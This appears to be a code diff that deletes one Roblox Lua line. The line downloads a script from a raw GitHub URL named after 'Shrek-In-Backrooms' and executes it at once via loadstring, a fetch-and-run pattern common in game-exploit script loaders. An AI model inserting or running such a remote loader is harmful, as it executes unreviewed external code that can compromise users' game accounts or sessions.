@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Geeblish/Shrek-In-Backrooms/main/main.lua'),true))()
